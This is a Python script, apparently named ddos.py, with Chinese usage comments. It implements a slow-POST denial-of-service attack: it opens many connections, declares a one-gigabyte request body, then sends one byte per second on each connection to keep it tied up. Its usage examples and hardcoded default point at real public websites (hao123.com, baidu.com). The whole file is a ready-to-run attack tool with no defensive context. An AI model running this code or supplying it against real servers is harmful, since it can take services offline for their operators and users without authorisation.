#python3.6

#python ddos.py -w "www.hao123.com" -p 80 -n 200 --page "/"
#-h查看帮助
#-w参数和-p参数不可缺省

import optparse
import socket
import time
import threading


socks=[]

def conn_thread(PORT,HOST,data2,MAX_CONN):
    global socks
    for i in range(0,MAX_CONN):
        s=socket.socket (socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((HOST,PORT))
            s.send(data2)
            print("[+] Send data OK!,conn=%d\n" % i)
            socks.append(s)
        except:
            print ("[-] Could not connect to server or send error")
            time.sleep(5)


def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send(b"f")
                print ("[+] send OK! %s"%s)
            except:
                print ("[-] send error\n")
                socks.remove(s)
                s.close()
        time.sleep(1)


def main():
    MAX_CONN = 10
    PORT = 80
    HOST = "www.baidu.com"
    PAGE = "/"
    MAX_CONN = 10

    parser = optparse.OptionParser()
    parser.add_option('-w', dest='HOST', type='string', help="IP address or Website")
    parser.add_option('-p', dest='PORT', type='int', help="Port num")
    parser.add_option('-n', dest='MAX_CONN', type='int', help="Max connect num")
    parser.add_option('--page', dest='PAGE', type='string', help="Url page")
    (options, args) = parser.parse_args()
    if(options.HOST==None)|(options.PORT==None):
        print('---wrong input!---'+'\n')
        exit(0)
    else:
        HOST = options.HOST
        PORT = options.PORT
    if(options.PAGE):
        PAGE = options.PAGE
    if(options.MAX_CONN):
        MAX_CONN = options.MAX_CONN

    data = ("POST %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "Content-Length: 1000000000\r\n"
            "Cookie: ddos_test\r\n"
             "\r\n" % (PAGE, HOST))
    print(data)
    data2 = data.encode('utf-8')
    conn_th=threading.Thread(target=conn_thread,args=(PORT,HOST,data2,MAX_CONN))
    send_th=threading.Thread(target=send_thread,args=())
    conn_th.start()
    send_th.start()


if __name__ =='__main__':
    main()